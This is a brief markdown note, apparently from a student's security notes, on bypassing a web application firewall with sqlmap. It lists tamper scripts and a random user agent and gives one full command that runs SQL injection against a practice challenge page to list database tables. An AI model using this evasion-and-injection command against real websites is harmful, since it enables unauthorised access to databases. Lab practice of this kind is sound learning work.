# WAF Bypass

## 2 things you need:
    1) --tamper=between,randomcase,space2comment
    2) --random-agent

## Example:
sqlmap -u "https://games.samsclass.info/sqli/chal2a.php?u=Steve%20Jobs" --tamper=between,randomcase,space2comment --random-agent -v 3 -p u --tables
